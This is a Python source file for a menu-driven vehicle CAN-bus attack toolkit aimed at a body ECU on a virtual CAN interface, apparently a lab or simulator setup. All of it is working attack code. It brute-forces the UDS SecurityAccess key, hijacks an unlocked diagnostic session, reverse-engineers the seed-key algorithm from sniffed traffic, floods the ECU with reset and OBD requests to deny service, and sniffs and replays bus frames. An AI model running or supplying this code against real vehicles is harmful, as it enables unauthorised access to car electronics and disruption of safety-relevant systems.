import can
import isotp
import time
from isotp import CanMessage
from typing import Dict, Tuple, Optional
from collections import deque


# ---------------- CAN IDs ----------------
functional_address  = 0x7DF         # needed for _rx_queues entry
body_ecu_physical   = 0x7E0
body_ecu            = 0x7E8

# ---------------- Known key search range (precomputed offline) ----------------
KEY_MIN = 0x11222000
KEY_MAX = 0x11222FFF


# ---------------- Bus + ISO-TP plumbing ----------------
bus = can.Bus(channel='vcan0', interface='socketcan')

def txfn(iso_msg: isotp.CanMessage) -> None:
    msg = can.Message(
        arbitration_id=iso_msg.arbitration_id,
        data=iso_msg.data,
        dlc=iso_msg.dlc,
        is_extended_id=False
    )
    bus.send(msg)

_rx_queues: Dict[int, deque] = {
    body_ecu: deque(),
    #engine_ecu: deque(),
}

def pump_bus(timeout: float = 0.0):
    """
    Read CAN frames and push any 0x7DF / 0x7E0 frames into queues.
    Must be called even while transmitting to catch FlowControl.
    """
    msg = bus.recv(timeout=timeout)
    while msg is not None:
        if msg.arbitration_id in _rx_queues:
            _rx_queues[msg.arbitration_id].append(
                CanMessage(arbitration_id=msg.arbitration_id, dlc=msg.dlc, data=msg.data)
            )
        msg = bus.recv(timeout=0.0)

def make_rxfn(for_rxid: int):
    def _rxfn(timeout: float):
        end = time.time() + timeout
        while True:
            if _rx_queues[for_rxid]:
                return _rx_queues[for_rxid].popleft()
            if timeout <= 0 or time.time() >= end:
                return None
            time.sleep(0.001)
    return _rxfn

# ---------------- ISO-TP dynamic stacks ----------------
DEFAULT_PARAMS = {
    "tx_padding": 0x55,
    "tx_data_length": 8,
    "tx_data_min_length": 8,
}

_stacks: Dict[Tuple[int, int], isotp.TransportLayer] = {}

def get_stack(txid: int, rxid: int, params: Optional[dict] = None) -> isotp.TransportLayer:
    key = (txid, rxid)
    if key in _stacks:
        return _stacks[key]

    addr = isotp.Address(
        isotp.AddressingMode.Normal_11bits,
        txid=txid,
        rxid=rxid
    )

    stack = isotp.TransportLayer(
        rxfn=make_rxfn(rxid),
        txfn=txfn,
        address=addr,
        params=params or DEFAULT_PARAMS
    )
    _stacks[key] = stack
    return stack

def ISOTP_SEND(data: bytes, txid: int, rxid: int):
    stack = get_stack(txid, rxid)
    stack.send(data)
    while stack.transmitting():
        pump_bus(timeout=0.01)     # catch FC while sending
        stack.process()
        time.sleep(stack.sleep_time())

def ISOTP_MULTI_RECEIVE(stacks, timeout=0.0):
    """
    pumps bus + processes all stacks and returns:
        req    → completed ISO-TP payload (bytes)
        rxid   → arbitration ID the request arrived on
    If no message arrives → returns (None, None)
    """
    end = time.time() + timeout

    while True:
        pump_bus(timeout=0.01)

        for st in stacks:
            st.process()
            payload = st.recv()
            if payload is not None:
                rxid_used = st.address.get_rx_arbitration_id()
                return payload, rxid_used

        # if timeout > 0 and time.time() >= end:
        #     return None, None

def ISOTP_RECEIVE(txid: int, rxid: int, timeout: float = 0.0):
    stack = get_stack(txid, rxid)
    end = time.time() + timeout
    while True:
        pump_bus(timeout=0.01)
        stack.process()
        msg = stack.recv()
        if msg is not None:
            return msg
        if timeout <= 0 or time.time() >= end:
            return None
        time.sleep(stack.sleep_time())

def pretty_hex(b: bytes) -> str:
    return " ".join(f"{x:02X}" for x in b)

# ---------------- Seed-based brute force attack ----------------

def UDS_ENUMERATE_DIDS_AND_RIDS():
    """
    Single-session UDS DID/RID enumerator.

    - Scans DIDs (0x22) and RIDs (0x31) only in the CURRENT ECU session.
    - Does NOT wait for 0x50 02 / 0x50 03 (Programming / Extended).
    - For DIDs: reports positive responses and NRC 0x22 (ConditionsNotCorrect).
    - For RIDs: reports positive responses and NRC 0x7E (RequestNotAllowed).
    """

    TXID = body_ecu_physical
    RXID = body_ecu

    # ---------------- internal helpers ----------------

    def _scan_dids(session_name: str,
                   start_did: int = 0xF000,
                   end_did: int   = 0xF1FF,
                   timeout: float = 0.5
                   ) -> tuple[dict[int, bytes], dict[int, bytes]]:
        """
        Brute-force DIDs with 0x22 in the CURRENT ECU state.

        We care about:
          - 62 DID_H DID_L ...       → accessible DID
          - 7F 22 22 (NRC 0x22)      → DID exists, ConditionsNotCorrect in this session
        All other NRCs are ignored.
        """
        dids_ok: dict[int, bytes]    = {}
        dids_nrc22: dict[int, bytes] = {}

        print(f"\n=== [DID SCAN] Session '{session_name}' "
              f"(0x22, range 0x{start_did:04X}–0x{end_did:04X}) ===")

        for did in range(start_did, end_did + 1):
            did_h = (did >> 8) & 0xFF
            did_l = did & 0xFF
            req = bytes([0x22, did_h, did_l])

            ISOTP_SEND(req, txid=TXID, rxid=RXID)
            resp = ISOTP_RECEIVE(txid=TXID, rxid=RXID, timeout=timeout)
            if resp is None or len(resp) < 3:
                continue

            # Positive read: 62 DID_H DID_L ...
            if resp[0] == 0x62 and resp[1] == did_h and resp[2] == did_l:
                data = resp[3:]
                dids_ok[did] = data
                print(f"[+] DID 0x{did:04X} supported in '{session_name}' | "
                      f"Resp: {' '.join(f'{b:02X}' for b in resp)}")
                continue

            # NRC 0x22 for Service 0x22 → ConditionsNotCorrect for that DID
            if resp[0] == 0x7F and resp[1] == 0x22 and resp[2] == 0x22:
                dids_nrc22[did] = resp
                print(f"[!] DID 0x{did:04X} → 7F 22 22 (ConditionsNotCorrect) | "
                      f"Resp: {' '.join(f'{b:02X}' for b in resp)}")
                continue

        print(f"[*] Session '{session_name}' → "
              f"{len(dids_ok)} DIDs accessible, {len(dids_nrc22)} DIDs with NRC 0x22")
        return dids_ok, dids_nrc22

    def _scan_rids(session_name: str,
                   start_rid: int = 0x1000,
                   end_rid: int   = 0x1600,
                   timeout: float = 0.5
                   ) -> tuple[dict[int, dict], dict[int, dict]]:
        """
        Brute-force RIDs with 0x31 in the CURRENT ECU state.

        We care about:
          - 71 01 RID_H RID_L ... / 71 03 RID_H RID_L ...  → accessible RID (Start/Result)
          - 7F 31 7E                                           → RequestNotAllowed (blocked in this session)
        All other NRCs are ignored.
        """
        rids_ok:    dict[int, dict] = {}
        rids_nrc7e: dict[int, dict] = {}

        print(f"\n=== [RID SCAN] Session '{session_name}' "
              f"(0x31, range 0x{start_rid:04X}–0x{end_rid:04X}) ===")

        for rid in range(start_rid, end_rid + 1):
            rid_h = (rid >> 8) & 0xFF
            rid_l = rid & 0xFF

            info_ok = {
                "start_supported": False,
                "result_supported": False,
                "start_resp": None,
                "result_resp": None,
            }

            # ---------- StartRoutine (0x31 01) ----------
            req_start = bytes([0x31, 0x01, rid_h, rid_l])
            ISOTP_SEND(req_start, txid=TXID, rxid=RXID)
            resp_start = ISOTP_RECEIVE(txid=TXID, rxid=RXID, timeout=timeout)

            if resp_start is not None and len(resp_start) >= 3:
                # Positive start: 71 01 RID_H RID_L ...
                if (len(resp_start) >= 4 and
                    resp_start[0] == 0x71 and
                    resp_start[1] == 0x01 and
                    resp_start[2] == rid_h and
                    resp_start[3] == rid_l):
                    info_ok["start_supported"] = True
                    info_ok["start_resp"] = resp_start
                    print(f"[+] RID 0x{rid:04X} START supported in '{session_name}' | "
                          f"Resp: {' '.join(f'{b:02X}' for b in resp_start)}")

                # NRC 0x7E for Service 0x31 → RequestNotAllowed for this RID
                elif resp_start[0] == 0x7F and resp_start[1] == 0x31 and resp_start[2] == 0x7E:
                    rids_nrc7e[rid] = {
                        "phase": "Start",
                        "resp": resp_start,
                    }
                    print(f"[!] RID 0x{rid:04X} START → 7F 31 7E (RequestNotAllowed) | "
                          f"Resp: {' '.join(f'{b:02X}' for b in resp_start)}")
                    # No need to query results if Start is blocked
                    continue

            # ---------- GetResults (0x31 03) if Start was OK ----------
            if info_ok["start_supported"]:
                req_res = bytes([0x31, 0x03, rid_h, rid_l])
                ISOTP_SEND(req_res, txid=TXID, rxid=RXID)
                resp_res = ISOTP_RECEIVE(txid=TXID, rxid=RXID, timeout=timeout)

                if resp_res is not None and len(resp_res) >= 3:
                    # Positive result: 71 03 RID_H RID_L ...
                    if (len(resp_res) >= 4 and
                        resp_res[0] == 0x71 and
                        resp_res[1] == 0x03 and
                        resp_res[2] == rid_h and
                        resp_res[3] == rid_l):
                        info_ok["result_supported"] = True
                        info_ok["result_resp"] = resp_res
                        print(f"[+] RID 0x{rid:04X} RESULT supported in '{session_name}' | "
                              f"Resp: {' '.join(f'{b:02X}' for b in resp_res)}")

                    # NRC 0x7E on Result
                    elif resp_res[0] == 0x7F and resp_res[1] == 0x31 and resp_res[2] == 0x7E:
                        rids_nrc7e[rid] = {
                            "phase": "Result",
                            "resp": resp_res,
                        }
                        print(f"[!] RID 0x{rid:04X} RESULT → 7F 31 7E (RequestNotAllowed) | "
                              f"Resp: {' '.join(f'{b:02X}' for b in resp_res)}")

            # Store as accessible if any positive phase
            if info_ok["start_supported"] or info_ok["result_supported"]:
                rids_ok[rid] = info_ok

        print(f"[*] Session '{session_name}' → "
              f"{len(rids_ok)} RIDs accessible, {len(rids_nrc7e)} RIDs with NRC 0x7E")
        return rids_ok, rids_nrc7e

    def _print_session_report(session_name: str,
                              dids_ok: dict[int, bytes],
                              dids_nrc22: dict[int, bytes],
                              rids_ok: dict[int, dict],
                              rids_nrc7e: dict[int, dict]) -> None:
        print(f"\n========== UDS ENUMERATION REPORT — {session_name} ==========")

        # --------- DIDs ---------
        if dids_ok:
            print("\n[DIDs — accessible]")
            for did in sorted(dids_ok.keys()):
                data = dids_ok[did]
                data_str = " ".join(f"{b:02X}" for b in data) if data else "(no data)"
                print(f"  DID 0x{did:04X} → {data_str}")
        else:
            print("\n[DIDs — accessible] None")

        if dids_nrc22:
            print("\n[DIDs — NRC 0x22 (ConditionsNotCorrect)]")
            for did in sorted(dids_nrc22.keys()):
                resp = dids_nrc22[did]
                resp_str = " ".join(f"{b:02X}" for b in resp)
                print(f"  DID 0x{did:04X} → {resp_str}")
        else:
            print("\n[DIDs — NRC 0x22 (ConditionsNotCorrect)] None")

        # --------- RIDs ---------
        if rids_ok:
            print("\n[RIDs — accessible]")
            for rid in sorted(rids_ok.keys()):
                info = rids_ok[rid]
                flags = []
                if info.get("start_supported"):
                    flags.append("Start")
                if info.get("result_supported"):
                    flags.append("Result")
                flag_str = "/".join(flags) if flags else "None"
                print(f"  RID 0x{rid:04X} → {flag_str}")
        else:
            print("\n[RIDs — accessible] None")

        if rids_nrc7e:
            print("\n[RIDs — NRC 0x7E (RequestNotAllowed)]")
            for rid in sorted(rids_nrc7e.keys()):
                info = rids_nrc7e[rid]
                phase = info["phase"]
                resp  = info["resp"]
                resp_str = " ".join(f"{b:02X}" for b in resp)
                print(f"  RID 0x{rid:04X} ({phase}) → {resp_str}")
        else:
            print("\n[RIDs — NRC 0x7E (RequestNotAllowed)] None")

        print("====================================================\n")

    # ---------------- main logic ----------------

    session_label = "CurrentSession"

    dids_ok, dids_nrc22   = _scan_dids(session_label)
    rids_ok, rids_nrc7e   = _scan_rids(session_label)
    _print_session_report(session_label, dids_ok, dids_nrc22, rids_ok, rids_nrc7e)

    print("[*] UDS DID/RID enumeration (current session only) completed.")
def BRUTE_FORCE_ATTACK():
    """
    Seed-based brute force on SecurityAccess key (27 02) for Body ECU.
    Uses only KEY_MIN/KEY_MAX, no ECU internal info.
    """
    # 1) Request seed: 27 01
    req_seed = bytes([0x27, 0x01])
    print(f"[ATTACK] → 0x{body_ecu_physical:03X} : {pretty_hex(req_seed)}")
    ISOTP_SEND(req_seed, txid=body_ecu_physical, rxid=body_ecu)

    resp = ISOTP_RECEIVE(txid=body_ecu_physical, rxid=body_ecu, timeout=5.0)
    if resp is None:
        print("[ATTACK] No response to 27 01")
        return

    print(f"[ATTACK] ← 0x{body_ecu:03X} : {pretty_hex(resp)}")

    # Expect 67 01 <seed>
    if not (len(resp) >= 3 and resp[0] == 0x67 and resp[1] == 0x01):
        print("[ATTACK] Unexpected seed response")
        return

    seed_bytes = resp[2:]
    key_len = len(seed_bytes)
    print(f"[ATTACK] Seed: {seed_bytes.hex()} (len={key_len})")
    print(f"[ATTACK] Brute force keys from 0x{KEY_MIN:08X} to 0x{KEY_MAX:08X}")

    # 2) Brute-force key directly in [KEY_MIN .. KEY_MAX]
    attempts = 0
    for k in range(KEY_MIN, KEY_MAX + 1):
        key_bytes = k.to_bytes(key_len, byteorder="big")
        frame = bytes([0x27, 0x02]) + key_bytes

        ISOTP_SEND(frame, txid=body_ecu_physical, rxid=body_ecu)
        resp2 = ISOTP_RECEIVE(txid=body_ecu_physical, rxid=body_ecu, timeout=2.0)

        attempts += 1
        if attempts % 50 == 0:
            print(f"[ATTACK] Attempts: {attempts}, last key: 0x{k:08X}", end="\r")

        if resp2 is None:
            continue

        # Positive response: 67 02 <key>
        if len(resp2) >= 2 and resp2[0] == 0x67 and resp2[1] == 0x02:
            print()
            print(f"[ATTACK] SUCCESS after {attempts} attempts")
            print(f"[ATTACK] Key int   : 0x{k:08X}")
            print(f"[ATTACK] Key bytes : {pretty_hex(key_bytes)}")
            print(f"[ATTACK] ECU resp  : {pretty_hex(resp2)}")
            return

        # Lockout: 7F 27 33
        if len(resp2) >= 3 and resp2[0] == 0x7F and resp2[1] == 0x27 and resp2[2] == 0x33:
            print()
            print("[ATTACK] ECU entered lockout (7F 27 33). Stopping.")
            return

    print()
    print("[ATTACK] Exhausted key range, no valid key found.")
def MITM_ATTACK():
    """
    MITM attack that:
      1) Waits until ECU sends 67 02 (SecurityAccess granted) using ISO-TP receive.
      2) Immediately sends 10 03 (Extended Session) to ECU.
      3) Then sends 3E 00 (TesterPresent) every 2 seconds to keep S3 alive.
    """

    print("[MITM] Waiting (ISO-TP) for ECU positive key response (67 02)...")

    # 1) Use ISO-TP RECEIVE to watch decoded UDS payloads from ECU
    #    We ignore everything until we see a 67 02.
    while True:
        resp = ISOTP_RECEIVE(txid=body_ecu_physical, rxid=body_ecu, timeout=0.5)
        if resp is None:
            continue

        # ISO-TP already stripped PCI, so resp[0] / resp[1] are UDS bytes
        # 67 02 <key...>
        if len(resp) >= 2 and resp[0] == 0x67 and resp[1] == 0x02:
            print(f"[MITM] Saw 67 02 from ECU (decoded UDS): {pretty_hex(resp)}")
            break
        else:
            # For debugging, you can uncomment:
            # print(f"[MITM] Ignoring ECU frame: {pretty_hex(resp)}")
            pass

    # 2) Send 10 03 (Extended Session) via ISO-TP
    frame = bytes([0x10, 0x03])
    print(f"[MITM] → 0x{body_ecu_physical:03X} : {pretty_hex(frame)} (request Extended Session)")
    ISOTP_SEND(frame, txid=body_ecu_physical, rxid=body_ecu)

    resp = ISOTP_RECEIVE(txid=body_ecu_physical, rxid=body_ecu, timeout=5.0)
    if resp is None:
        print("[MITM] No response to 10 03")
        return

    print(f"[MITM] ← 0x{body_ecu:03X} : {pretty_hex(resp)}")

    # Expect 50 03 in decoded payload
    if not (len(resp) >= 2 and resp[0] == 0x50 and resp[1] == 0x03):
        print("[MITM] ECU did not accept Extended Session (no 50 03). Abort.")
        return

    print("[MITM] Extended Session is ON. Starting periodic TesterPresent every 2 seconds...")

    # 3) Periodic 3E 00
    tp_frame = bytes([0x3E, 0x00])
    while True:
        print(f"[MITM] → 0x{body_ecu_physical:03X} : {pretty_hex(tp_frame)} (TesterPresent)")
        ISOTP_SEND(tp_frame, txid=body_ecu_physical, rxid=body_ecu)
        resp_tp = ISOTP_RECEIVE(txid=body_ecu_physical, rxid=body_ecu, timeout=2.0)
        if resp_tp is not None:
            print(f"[MITM] ← 0x{body_ecu:03X} : {pretty_hex(resp_tp)}")
        else:
            print("[MITM] No TP response (ECU may still be fine, depending on implementation).")
        time.sleep(2.0)
def REVERSE_ENGINEERING_ATTACK():
    # ===== STEP 1: COLLECT THREE PAIRS =====
    DATA_LOG = []
    num = 0
    seed_flag = 0
    key_flag = 0
    seed_bytes = b""
    key_bytes = b""

    while num < 3:
        resp = ISOTP_RECEIVE(txid=body_ecu_physical, rxid=body_ecu, timeout=0.5)
        if resp is None:
            continue

        if len(resp) >= 2 and resp[0] == 0x67 and resp[1] == 0x01:
            seed_bytes = resp[2:]
            seed_flag = 1

        if len(resp) >= 2 and resp[0] == 0x67 and resp[1] == 0x02:
            key_bytes = resp[2:]
            key_flag = 1

        if seed_flag and key_flag:
            DATA_LOG.append((seed_bytes, key_bytes))
            num += 1
            seed_flag = 0
            key_flag = 0

    # ===== STEP 2: COMPUTE ALGORITHM =====
    seed0, key0 = DATA_LOG[0]
    L = len(seed0)
    M = 1 << (8 * L)

    s0 = int.from_bytes(seed0, "big")
    k0 = int.from_bytes(key0, "big")

    C_add = (k0 - s0) % M
    C_sub = (s0 - k0) % M
    C_xor = s0 ^ k0
    C_mul = k0 // s0 if s0 != 0 and (k0 % s0) == 0 else None

    add_ok = True
    sub_ok = True
    xor_ok = True
    mul_ok = True

    for seed_b, key_b in DATA_LOG:
        s = int.from_bytes(seed_b, "big")
        k = int.from_bytes(key_b, "big")

        if (s + C_add) % M != k:
            add_ok = False
        if (s - C_sub) % M != k:
            sub_ok = False
        if (s ^ C_xor) != k:
            xor_ok = False
        if C_mul is None or (s * C_mul) % M != k:
            mul_ok = False

    if add_ok:
        alg = "add"
        CONST = C_add
    elif sub_ok:
        alg = "sub"
        CONST = C_sub
    elif xor_ok:
        alg = "xor"
        CONST = C_xor
    elif mul_ok:
        alg = "mul"
        CONST = C_mul
    else:
        print("No valid algorithm found.")
        return

    print(f"Algorithm: {alg}")
    print(f"Constant:  0x{CONST:0{L*2}X}")

    # ===== STEP 3: COMPUTE CORRECT KEY FOR ALL 3 PAIRS =====
    print("\nCorrect keys:")
    for seed_b, _ in DATA_LOG:
        s = int.from_bytes(seed_b, "big")

        if alg == "add":
            k_new = (s + CONST) % M
        elif alg == "sub":
            k_new = (s - CONST) % M
        elif alg == "xor":
            k_new = s ^ CONST
        elif alg == "mul":
            k_new = (s * CONST) % M

        print(k_new.to_bytes(L, "big").hex().upper())
def RESER_ECU_SPAMMING(duration_seconds):

    req= bytes([0x11, 0x01])

    start_time = time.time()
    frame_count = 0

    while time.time() - start_time < duration_seconds:
        try:
            print(f"[ATTACK] → 0x{body_ecu_physical:03X} : {pretty_hex(req)}")
            ISOTP_SEND(req, txid=body_ecu_physical, rxid=body_ecu)
            frame_count += 1
        except can.CanError:
            # bus overflow or driver error; ignore and keep trying
            continue

    print(f"[DoS] Sent {frame_count} frames with ID {body_ecu_physical:03X}")
def scan_mode_pids(mode: int,pid_start: int = 0x00,pid_end: int = 0xFF,txid: int = body_ecu_physical,rxid: int = body_ecu,timeout: float = 0.5) -> dict[int, bytes]:
    """
    Brute-force all PIDs for a single OBD mode on your ECU.

    Returns:
        { pid: data_bytes }
    """
    supported = {}
    print(f"\n=== Scanning Mode 0x{mode:02X} ===")

    for pid in range(pid_start, pid_end + 1):
        req = bytes([mode, pid])
        ISOTP_SEND(req, txid=txid, rxid=rxid)
        time.sleep(0.1)
        resp = ISOTP_RECEIVE(txid=txid, rxid=rxid, timeout=timeout)

        # No response → treat as not supported
        if resp is None or len(resp) == 0:
            continue

        # -------- Mode 01: your ECU uses 41 <pid> <data...> --------
        if mode == 0x01:
            if len(resp) < 2:
                continue
            if resp[0] != 0x41:
                # negative / unrelated response
                continue
            if resp[1] != pid:
                # stale frame or other PID
                continue
            data = resp[2:]

        # -------- Mode 09: your ECU sends only raw VIN for PID 0x02 --------
        elif mode == 0x09:
            # OBD_REQUEST_VEHICLE_INFO:
            #   pid == 0x02 → VIN bytes (no mode/pid header)
            #   else        → [0x12, pid] or [0x7F, pid]
            if pid == 0x02 and resp[0] not in (0x12, 0x7F):
                data = resp[:]      # VIN bytes only
            else:
                # 0x12 / 0x7F → treat as not supported for enumeration
                continue

        # -------- Generic OBD mode handling (for future modes) --------
        else:
            # standard positive OBD response: (mode + 0x40) <pid> <data...>
            if len(resp) < 2:
                continue
            if resp[0] != (mode + 0x40):
                continue
            if resp[1] != pid:
                continue
            data = resp[2:]

        supported[pid] = data
        print(f"[+] Mode 0x{mode:02X} PID 0x{pid:02X} | "
              f"Resp: {' '.join(f'{b:02X}' for b in resp)}")

    print(f"[*] Mode 0x{mode:02X} → {len(supported)} supported PIDs\n")
    return supported

def PID_ENUMERATIONS():
    print("[*] Starting PID Enumeration for all OBD modes..\n")

    # Only include modes your ECU actually handles today.
    # When you implement Mode 02/03/... just add them here.
    MODES_TO_SCAN = [0x01, 0x09]

    all_supported: dict[int, dict[int, bytes]] = {}

    for mode in MODES_TO_SCAN:
        mode_supported = scan_mode_pids(mode)
        all_supported[mode] = mode_supported

    # Summary
    print("\n========== GLOBAL SUMMARY ==========")
    total = 0
    for mode, pids in all_supported.items():
        print(f"\nMode 0x{mode:02X}: {len(pids)} PIDs")
        for pid, data in pids.items():
            data_str = " ".join(f"{b:02X}" for b in data) if data else "(no data)"
            print(f"  PID 0x{pid:02X} → {data_str}")
        total += len(pids)

    print("\n====================================")
    print(f"[*] Total Supported PID/Mode pairs found: {total}")
    print("====================================\n")
def OBD_DOS(duration_seconds):
    req = bytes([0x00, 0x02])

    start_time = time.time()
    frame_count = 0

    while time.time() - start_time < duration_seconds:
        try:
            print(f"[ATTACK] → 0x{body_ecu_physical:03X} : {pretty_hex(req)}")
            ISOTP_SEND(req, txid=body_ecu_physical, rxid=body_ecu)
            frame_count += 1
        except can.CanError:
            # bus overflow or driver error; ignore and keep trying
            continue

    print(f"[DoS] Sent {frame_count} frames with ID {body_ecu_physical:03X}")

def OBD_SNIFF_AND_REPLAY(duration_seconds: int = 10,replay_delay: float = 0.01) -> None:
    """
    Simple OBD replay:
      - Phase 1: sniff all frames on vcan0 for <duration_seconds>.
      - Phase 2: replay ONLY ECU responses (ID=body_ecu), not tester frames.

    If you replay tester frames (ID=body_ecu_physical), the ECU will answer
    again and you will see duplicates. That is what was happening before.
    """

    print(f"\n[REPLAY] Sniffing for {duration_seconds} seconds on vcan0 ...")

    captured = []  # list of tuples: (can_id, dlc, data_bytes)
    end_time = time.time() + duration_seconds

    while time.time() < end_time:
        msg = bus.recv(timeout=0.2)
        if msg is None:
            continue

        data_bytes = bytes(msg.data)
        line = f"{msg.arbitration_id:03X}|{msg.dlc}|{' '.join(f'{b:02X}' for b in data_bytes)}"
        print(f"[SNIFF] {line}")

        captured.append((msg.arbitration_id, msg.dlc, data_bytes))

    print(f"[REPLAY] Sniffing done. Captured {len(captured)} frames.")

    if not captured:
        print("[REPLAY] Nothing to replay.")
        return

    print("[REPLAY] Replaying captured ECU responses only ...")

    count = 0
    for can_id, dlc, data_bytes in captured:
        # -------- KEY CHANGE: skip tester frames 7E0 --------
        if can_id == body_ecu_physical:
            continue

        # only replay ECU frames (e.g. 7E8)
        payload = data_bytes[:dlc]

        msg = can.Message(
            arbitration_id=can_id,
            data=payload,
            is_extended_id=False
        )

        try:
            bus.send(msg)
            count += 1
            print(f"[REPLAY] → ID={can_id:03X} DLC={dlc} DATA={' '.join(f'{b:02X}' for b in payload)}")
        except can.CanError:
            continue

        time.sleep(replay_delay)

    print(f"[REPLAY] Finished. Replayed {count} frames.")

# ---------------- Main menu loop ----------------
DATA_LOG=[]
while True:
    print("\n=== Attacks Menu ===")
    print("1) OBD")
    print("2) UDS")
    choice = input("Select option: ").strip()
    if choice == "1":
        print("\n=== OBD Attacks Menu ===")
        print("1) PID Enumerations")
        print("2) DoS Attack")
        print("3) Replay Attack")

        choice_2 = input("Select option: ").strip()
        if choice_2 == "1":
            PID_ENUMERATIONS()
        elif choice_2 == "2":
            duration = int(input("Attack duration (seconds): "))
            OBD_DOS(duration_seconds=duration)
        elif choice_2 == "3":
            duration = int(input("Sniff duration (seconds): "))
            OBD_SNIFF_AND_REPLAY(duration_seconds=duration)
    elif choice == "2":
        print("\n=== UDS Attacks Menu ===")
        print("1) DID/RID Enumerations")
        print("2) MITM")
        print("3) Seed Based Brute Force")
        print("4) Seed-Key Algorithm Reverse Engineering")
        print("5) Reset ECU Spamming")
        choice_2 = input("Select option: ").strip()
        if choice_2 == "1":
            UDS_ENUMERATE_DIDS_AND_RIDS()
        elif choice_2 == "2":
            MITM_ATTACK()
        elif choice_2 == "3":
            BRUTE_FORCE_ATTACK()
        elif choice_2 == "4":
            REVERSE_ENGINEERING_ATTACK()
        elif choice_2 == "5":
            duration = int(input("Attack duration (seconds): "))
            RESER_ECU_SPAMMING(duration_seconds=duration)
    else:
        pass
